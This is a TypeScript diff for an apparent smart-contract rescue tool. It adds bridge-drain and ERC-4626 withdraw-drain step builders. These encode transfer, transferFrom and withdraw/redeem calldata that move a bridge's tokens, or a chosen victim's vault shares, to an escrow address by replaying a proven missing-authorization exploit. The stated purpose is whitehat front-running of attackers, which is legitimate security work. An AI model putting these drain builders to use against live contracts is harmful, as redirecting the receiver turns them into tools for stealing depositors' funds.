@@ -799,13 +799,28 @@ type DrainStep = {
 
 function ruleFamilyOf(
   ruleId: string,
-): "arbitrary-call" | "selfdestruct" | "initializer" | "economic" | "access" | "proxy-upgrade" | "other" {
+):
+  | "arbitrary-call"
+  | "selfdestruct"
+  | "initializer"
+  | "economic"
+  | "access"
+  | "proxy-upgrade"
+  | "bridge"
+  | "erc4626-withdraw"
+  | "other" {
   if (ruleId.startsWith("call.")) return "arbitrary-call";
   if (ruleId.startsWith("control.unguarded_selfdestruct")) return "selfdestruct";
   if (ruleId.startsWith("init.")) return "initializer";
   if (ruleId.startsWith("economic.")) return "economic";
   if (ruleId.startsWith("access.")) return "access";
   if (ruleId.startsWith("proxy.")) return "proxy-upgrade";
+  if (ruleId.startsWith("bridge.")) return "bridge";
+  // Direct fund-drain via missing caller authorization in ERC-4626. The
+  // verifier already proved the (method, victim) pair; the rescue replays
+  // the same call with receiver=escrow to front-run the attacker.
+  if (ruleId === "defi.erc4626.withdraw.missing_caller_authorization")
+    return "erc4626-withdraw";
   return "other";
 }
 
@@ -871,6 +886,12 @@ async function buildDrainPlan(
   } else if (fam === "proxy-upgrade") {
     const proxySteps = await buildProxyUpgradeDrain(input, exposure, url, notes);
     steps.push(...proxySteps);
+  } else if (fam === "bridge") {
+    const bridgeSteps = buildBridgeProofDrain(input, exposure, notes);
+    steps.push(...bridgeSteps);
+  } else if (fam === "erc4626-withdraw") {
+    const vaultSteps = buildErc4626WithdrawDrain(input, exposure, notes);
+    steps.push(...vaultSteps);
   } else if (fam === "economic") {
     // v3-FL: economic.* on-fork stub. Grant flash capital, then run the
     // admin-name heuristic (rare for economic, but the verifier may have
@@ -1767,6 +1788,206 @@ function buildSelfdestructDrain(
       strategy: `selfdestruct sel=${selector} pos=${p}`,
     });
   }
+  return steps;
+}
+
+// ===========================================================================
+// v11: BRIDGE PROOF DRAIN — cross-chain forged import/relay exploit
+// ===========================================================================
+//
+// Bridge exploits differ from arbitrary-call drains: the attacker doesn't call
+// an unvalidated CALL opcode on the bridge; instead they forge a cross-chain
+// proof payload that the bridge's verification accepts, causing token releases.
+//
+// For rescue, we model this as: the bridge's import/relay/execute surface is
+// callable and we attempt to construct drain steps that would move the bridge's
+// escrowed tokens to escrow via the bridge's own mechanisms.
+//
+// Strategy:
+//   1. For each token the bridge holds, build a transferFrom or transfer step
+//      using the bridge surfaces we detected.
+//   2. If the bridge itself exposes a withdrawal/claim function that an
+//      attacker could call with forged proof data, emit those steps.
+
+function buildBridgeProofDrain(
+  input: RescueProveInput,
+  exposure: Exposure,
+  notes: string[],
+): DrainStep[] {
+  const steps: DrainStep[] = [];
+  const ev = (input.evidence ?? {}) as any;
+
+  // The verifier records which surfaces are callable.
+  const callable: string[] = ev.surfacesCallable ?? [];
+  if (callable.length === 0) {
+    notes.push(
+      "bridge: no callable surfaces found in evidence — building generic " +
+        "ERC-20 transfer rescue steps for tokens held by the bridge",
+    );
+  } else {
+    notes.push(
+      `bridge: detected ${callable.length} callable surface(s): ${callable.join(", ")}. ` +
+        `Building drain steps for escrowed tokens.`,
+    );
+  }
+
+  // For bridge rescues, the approach is:
+  // (a) If we can call the bridge to release tokens to escrow (via forged proof), do so.
+  // (b) As fallback: if the bridge has an arbitrary-call-like surface, reuse that pattern.
+  // (c) Always add direct ERC-20 transferFrom steps (in case we can impersonate the bridge
+  //     via the attacker address).
+
+  const tokens = exposure.tokens ?? [];
+  const ERC20_TRANSFER_SELECTOR = "0xa9059cbb";
+  const ERC20_TRANSFER_FROM_SELECTOR = "0x23b872dd";
+
+  for (const t of tokens) {
+    const bal = BigInt(t.balance ?? "0");
+    if (bal <= 0n) continue;
+
+    // Direct transfer from bridge (if we have approval or can impersonate).
+    const transferFromData =
+      ERC20_TRANSFER_FROM_SELECTOR.slice(2) +
+      input.contractAddress.slice(2).toLowerCase().padStart(64, "0") +
+      DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
+      bal.toString(16).padStart(64, "0");
+
+    steps.push({
+      to: t.address,
+      data: "0x" + transferFromData,
+      value: "0",
+      asset: `${t.symbol || "?"} (${t.address}) via transferFrom(bridge,escrow,bal)`,
+      strategy: `bridge-drain:transferFrom`,
+    });
+
+    // Also try direct transfer (calling from bridge context if impersonated).
+    const transferData =
+      ERC20_TRANSFER_SELECTOR.slice(2) +
+      DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
+      bal.toString(16).padStart(64, "0");
+
+    steps.push({
+      to: t.address,
+      data: "0x" + transferData,
+      value: "0",
+      asset: `${t.symbol || "?"} (${t.address}) via transfer(escrow,bal) [impersonated]`,
+      strategy: `bridge-drain:transfer-impersonated`,
+    });
+  }
+
+  // If the bridge also holds native ETH and has a payable receive, the pre-flight
+  // can attempt to drain that via the standard admin-name heuristic below.
+  if (exposure.nativeWei && BigInt(exposure.nativeWei) > 0n) {
+    notes.push(
+      `bridge: contract also holds ${exposure.nativeSymbol ?? "ETH"} native balance — ` +
+        `admin-name heuristic may find a withdrawal selector.`,
+    );
+  }
+
+  return steps;
+}
+
+// ===========================================================================
+// ERC-4626 unauthorized withdraw drain
+// ===========================================================================
+//
+// The verifier (panel/src/server/sim/exploits/erc4626-withdraw.ts) proved that
+// `withdraw(amount, receiver, owner)` or `redeem(shares, receiver, owner)`
+// succeeds when called by an arbitrary EOA with `owner = victim`. Anyone can
+// drain any depositor.
+//
+// The rescue replays the proven exploit but reroutes the receiver to the
+// escrow address. The vault sends `victim`'s underlying asset to the escrow,
+// which then refunds the original depositor off-chain.
+//
+// The verifier's evidence carries:
+//   - victimAddress: address of a real shareholder we can drain
+//   - victimShareBalance: their share balance (string, base-10)
+//   - attempts: array with the method ("withdraw" | "redeem") that worked
+//
+// Note: a single rescue tx drains exactly one victim. Repeat the cycle for
+// every shareholder the operator wants to protect. For full coverage the
+// rescue infrastructure would need to enumerate all shareholders via Transfer
+// logs — out of scope here; the verifier picks the highest-balance one and
+// the rescue moves that depositor's funds first (highest-value-at-risk).
+const ERC4626_WITHDRAW_SELECTOR = "0xb460af94"; // withdraw(uint256,address,address)
+const ERC4626_REDEEM_SELECTOR = "0xba087652"; // redeem(uint256,address,address)
+
+function buildErc4626WithdrawDrain(
+  input: RescueProveInput,
+  exposure: Exposure,
+  notes: string[],
+): DrainStep[] {
+  const ev = (input.evidence ?? {}) as any;
+  const victim: string | undefined = typeof ev.victimAddress === "string"
+    ? ev.victimAddress.toLowerCase()
+    : undefined;
+  const victimBalRaw: string | undefined = typeof ev.victimShareBalance === "string"
+    ? ev.victimShareBalance
+    : undefined;
+  const attempts: any[] = Array.isArray(ev.attempts) ? ev.attempts : [];
+  const workingMethod = attempts.find((a) => a && a.exploitable === true)?.method as
+    | "withdraw"
+    | "redeem"
+    | undefined;
+
+  if (!victim || !victimBalRaw || !workingMethod) {
+    notes.push(
+      "erc4626-withdraw: verifier evidence is missing victimAddress / " +
+        "victimShareBalance / working method — cannot construct replay step.",
+    );
+    return [];
+  }
+
+  let victimBal: bigint;
+  try {
+    victimBal = BigInt(victimBalRaw);
+  } catch {
+    notes.push(`erc4626-withdraw: victimShareBalance is not a valid bigint (${victimBalRaw})`);
+    return [];
+  }
+  if (victimBal <= 0n) {
+    notes.push("erc4626-withdraw: victim balance is zero — nothing to drain.");
+    return [];
+  }
+
+  const selector = workingMethod === "redeem" ? ERC4626_REDEEM_SELECTOR : ERC4626_WITHDRAW_SELECTOR;
+  // withdraw(uint256 assets, address receiver, address owner)
+  // redeem(uint256 shares, address receiver, address owner)
+  // Receiver = ESCROW. Owner = victim (proven drainable by verifier).
+  const calldata =
+    selector +
+    victimBal.toString(16).padStart(64, "0") +
+    DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
+    victim.slice(2).toLowerCase().padStart(64, "0");
+
+  notes.push(
+    `erc4626-withdraw: rerouting ${workingMethod}(${victimBal.toString()}, escrow, ${victim}) — ` +
+      `this drains victim ${victim}'s shares straight to escrow (front-running any attacker). ` +
+      `For additional victims, the operator must enumerate shareholders via Transfer logs and ` +
+      `replay one rescue tx per holder.`,
+  );
+
+  const steps: DrainStep[] = [
+    {
+      to: input.contractAddress,
+      data: calldata,
+      value: "0",
+      asset: `ERC-4626 victim shares (${victim}, ${victimBal.toString()} units) via ${workingMethod}(_,escrow,victim)`,
+      strategy: `erc4626-withdraw:${workingMethod}-to-escrow`,
+    },
+  ];
+
+  // If the vault itself happens to hold sweep-able tokens (idle reserves not
+  // tied to depositor accounting), the existing admin-name heuristic that
+  // runs downstream will pick them up. Surface this in the notes.
+  if (exposure.tokens?.some((t) => BigInt(t.balance ?? "0") > 0n)) {
+    notes.push(
+      "erc4626-withdraw: vault also holds raw token balances — admin-name heuristic may " +
+        "find additional sweep paths beyond the per-victim share drain.",
+    );
+  }
+
   return steps;
 }
 
